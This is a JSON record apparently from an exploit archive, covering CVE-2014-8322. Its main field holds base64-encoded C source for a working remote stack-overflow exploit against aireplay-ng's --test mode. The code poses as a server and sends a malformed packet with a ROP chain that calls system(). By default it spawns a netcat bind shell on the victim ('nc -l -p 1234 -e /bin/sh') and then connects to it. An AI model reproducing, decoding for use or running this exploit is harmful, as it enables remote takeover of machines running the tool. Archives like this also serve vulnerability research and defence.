{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIEV4cGxvaXQgVGl0bGU6IEFpcmVwbGF5ICJ0Y3BfdGVzdCIgTGVuZ3RoIFBhcmFtZXRlciBJbmNvbnNpc3RlbmN5DQogKiBEYXRlOiAxMC8zLzIwMTQNCiAqIEV4cGxvaXQgQXV0aG9yOiBOaWNrIFNhbXBhbmlzDQogKiBWZW5kb3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cuYWlyY3JhY2stbmcub3JnLw0KICogVmVyc2lvbjogQWlyZXBsYXktbmcgMS4yIGJldGEzDQogKiBUZXN0ZWQgb246IEthbGkgTGludXggMS4wLjkgeDY0DQogKiBDVkUgOiBDVkUtMjAxNC04MzIyDQogKiBEZXNjcmlwdGlvbjogQWZmZWN0ZWQgb3B0aW9uICJhaXJlcGxheS1uZyAtLXRlc3QiDQogKi8NCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxzeXMvc2VsZWN0Lmg+DQojaW5jbHVkZSA8c3lzL3RpbWUuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4gICAgICAgICAgLyogU2VlIE5PVEVTICovDQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCg0KDQojZGVmaW5lIF9fcGFja2VkIF9fYXR0cmlidXRlX18gKChfX3BhY2tlZF9fKSkNCnN0cnVjdCBuZXRfaGRyIHsNCiAgICB1aW50OF90ICAgICBuaF90eXBlOw0KICAgIHVpbnQzMl90ICAgIG5oX2xlbjsNCiAgICB1aW50OF90ICAgICBuaF9kYXRhWzBdOw0KfV9fcGFja2VkOw0KDQojZGVmaW5lIFBPUF9SREkgICAgICJceGI4XHgyOVx4NDBceDAwXHgwMFx4MDBceDAwXHgwMCINCiNkZWZpbmUgUE9QX1JCWCAgICAgIlx4ODhceDkyXHg0MVx4MDBceDAwXHgwMFx4MDBceDAwIg0KI2RlZmluZSBSUE9QX1JCWCAgICAiXHgwMFx4MDBceDAwXHgwMFx4MDBceDg4XHg5Mlx4NDEiDQojZGVmaW5lIE1PVl9UT19SREkgICJceGYzXHg0N1x4NDFceDAwXHgwMFx4MDBceDAwXHgwMCINCiNkZWZpbmUgQ09NTUFORCAgICAgIm5jIC1sIC1wIDEyMzQgLWUgL2Jpbi9zaFx4MDAiDQojZGVmaW5lIFNZU1RFTSAgICAgICJceDUwXHgyM1x4NDBceDAwXHgwMFx4MDBceDAwXHgwMCINCiNkZWZpbmUgUEFEX0JZVEVTICAgMTMwNA0KDQp1bnNpZ25lZCBjaGFyICpleHBsb2l0X2luaXQoY2hhciAqY29tbWFuZCwgc2l6ZV90IHNpemUpOw0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICAgIHN0cnVjdCBuZXRfaGRyIHJoOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2ZXIsIGNsaWVudDsNCiAgICB1bnNpZ25lZCBjaGFyICpleHBsb2l0Ow0KICAgIHNvY2tsZW5fdCBsZW47DQogICAgc2l6ZV90IHNpemU7DQogICAgY2hhciAqY29tbWFuZCwgZXhlY1sxMDI0XTsNCiAgICBpbnQgc29ja2ZkLCBjbCwgdmFsID0gMTsNCg0KICAgIHByaW50ZigiWytdRXhwbG9pdCBmb3IgYWlyZXBsYXktbmcgdGNwX3Rlc3QgcmVtb3RlIHN0YWNrIG92ZXJmbG93XG4iKTsNCiAgICBwcmludGYoIlsrXVdyaXR0ZW4gYnkgTmljayBTYW1wYW5pcyBDVkUtMjAxNC04MzIyXG4iKTsNCiAgICBpZiAoYXJnYyA9PSAxKSB7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCJbLV1Vc2FnZTogJXMgcG9ydCBjb21tYW5kXG4iDQogICAgICAgICAgICAgICAgIlstXVtEZWZhdWx0ICVzXVxuIiwgYXJndlswXSwgQ09NTUFORCk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgaWYgKChzb2NrZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiAgICAgICAgcGVycm9yKCJbLV1Tb2NrZXQoKSIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIG1lbXNldCgoY2hhciAqKSZzZXJ2ZXIsICdcMCcsIHNpemVvZihzZXJ2ZXIpKTsNCiAgICBsZW4gPSBzaXplb2Yoc2VydmVyKTsNCiAgICBzZXJ2ZXIuc2luX2FkZHIuc19hZGRyID0gMDsNCiAgICBzZXJ2ZXIuc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0pKTsNCiAgICBzZXJ2ZXIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgaWYgKGFyZ3ZbMl0pDQogICAgICAgIGNvbW1hbmQgPSBhcmd2WzJdOw0KICAgIGVsc2UNCiAgICAgICAgY29tbWFuZCA9IENPTU1BTkQ7DQoNCiAgICBzZXRzb2Nrb3B0KHNvY2tmZCwgU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsICZ2YWwsIHNpemVvZih2YWwpKTsNCiAgICBpZiAoYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2VydmVyLCBzaXplb2Yoc2VydmVyKSkgPT0gLTEpIHsNCiAgICAgICAgcGVycm9yKCJiaW5kKCkiKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBpZiAobGlzdGVuKHNvY2tmZCwgNSkgPT0gLTEpIHsNCiAgICAgICAgcGVycm9yKCJsaXN0ZW4oKSIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIHByaW50ZigiWytdU2VydmVyIGlzIHdhaXRpbmcgZm9yIGNvbm5lY3Rpb25zIG9uIHBvcnQgJWRcbiIsIGF0b2koYXJndlsxXSkpOw0KDQogICAgaWYgKCEoc2l6ZSA9IChzdHJsZW4oY29tbWFuZCkrOCkqNS80KjgrUEFEX0JZVEVTK3NpemVvZihyaCkpKQ0KICAgICAgICByZXR1cm4gLTE7DQogICAgZXhwbG9pdCA9IGV4cGxvaXRfaW5pdChjb21tYW5kLCBzaXplKTsNCiAgICB3aGlsZSAoMSkgew0KICAgICAgICBpZiAoKGNsID0gYWNjZXB0KHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZjbGllbnQsICZsZW4pKSA9PSAtMSkgew0KICAgICAgICAgICAgcGVycm9yKCJbLV1BY2NlcHQiKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgICAgICBwcmludGYoIlsrXUNsaWVudCAlcyBoYXMgYmVlbiBjb25uZWN0ZWRcbiIsIGluZXRfbnRvYShjbGllbnQuc2luX2FkZHIpKTsNCiAgICAgICAgaWYgKHNlbmQoY2wsIGV4cGxvaXQsIHNpemUsIDApID09IC0xKSB7DQogICAgICAgICAgICBwZXJyb3IoIlstXVNlbmQiKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAocmVjdihjbCwgJnJoLCBzaXplb2YocmgpLCAwKSA9PSAtMSkgew0KICAgICAgICAgICAgcGVycm9yKCJbLV1SZWN2Iik7DQogICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCiAgICAgICAgY2xvc2UoY2wpOw0KICAgICAgICBzbGVlcCgxKTsNCiAgICAgICAgaWYgKCFhcmd2WzJdKSB7DQogICAgICAgICAgICBwcmludGYoIlsrXUVuam95IHlvdXIgc2hlbGxcblxuIik7DQogICAgICAgICAgICBzbnByaW50ZihleGVjLCBzaXplb2YoZXhlYyksICJuYyAlcyAlZCIsIA0KICAgICAgICAgICAgICAgICAgICBpbmV0X250b2EoY2xpZW50LnNpbl9hZGRyKSwgYXRvaShhcmd2WzFdKSk7DQogICAgICAgICAgICBzeXN0ZW0oZXhlYyk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgfQ0KICAgIGNsb3NlKHNvY2tmZCk7DQogICAgZnJlZShleHBsb2l0KTsNCg0KICAgIHJldHVybiAwOw0KfQ0KDQp1bnNpZ25lZCBjaGFyICpleHBsb2l0X2luaXQoY2hhciAqY29tbWFuZCwgc2l6ZV90IHNpemUpDQp7DQogICAgdW5zaWduZWQgbG9uZyBEQVRBID0gMHg2MjY1YTA7DQogICAgdW5zaWduZWQgY2hhciAqYnVmZmVyLCAqZXhwbG9pdDsNCiAgICBzdHJ1Y3QgbmV0X2hkciBuaDsNCiAgICByZWdpc3RlciBpbnQgaSwgajsNCg0KICAgIGJ1ZmZlciA9IG1hbGxvYyhzaXplKTsNCiAgICBuaC5uaF90eXBlID0gMHgxOw0KICAgIG5oLm5oX2xlbiA9IGh0b25sKHNpemUtc2l6ZW9mKG5oKSk7DQogICAgbWVtY3B5KGJ1ZmZlciwgJm5oLCBzaXplb2YobmgpKTsNCiAgICBtZW1zZXQoYnVmZmVyK3NpemVvZihuaCksICdBJywgUEFEX0JZVEVTKTsNCiAgICBleHBsb2l0ID0gYnVmZmVyK3NpemVvZihuaCkrUEFEX0JZVEVTOw0KDQogICAgZm9yIChpID0gaiA9IDA7IGogPCBzdHJsZW4oY29tbWFuZCkrNDsgaSs9NSkgew0KICAgICAgICBtZW1jcHkoZXhwbG9pdCtpKjgsIFBPUF9SREksIDgpOw0KICAgICAgICBtZW1jcHkoZXhwbG9pdCsoaSsxKSo4LCAmREFUQSwgOCk7DQogICAgICAgIG1lbWNweShleHBsb2l0KyhpKzIpKjgsIFBPUF9SQlgsIDgpOw0KICAgICAgICBtZW1jcHkoZXhwbG9pdCsoaSszKSo4LCBjb21tYW5kK2osIDgpOw0KICAgICAgICBtZW1jcHkoZXhwbG9pdCsoaSs0KSo4LCBNT1ZfVE9fUkRJLCA4KTsNCiAgICAgICAgREFUQSArPSA0Ow0KICAgICAgICBqICs9IDQ7DQogICAgfQ0KICAgIERBVEEgPSAweDYyNjVhMDsgLyouZGF0YSovDQogICAgbWVtY3B5KGV4cGxvaXQraSo4LCBQT1BfUkRJLCA4KTsNCiAgICBtZW1jcHkoZXhwbG9pdCsoaSsxKSo4LCAmREFUQSwgOCk7IA0KICAgIG1lbWNweShleHBsb2l0KyhpKzIpKjgsIFNZU1RFTSwgOCk7DQoNCiAgICByZXR1cm4gYnVmZmVyOw0KfQ==", 
    "filename": "platforms/linux/remote/35018.c", 
    "id": "35018", 
    "cves": [
        "CVE-2014-8322"
    ]
}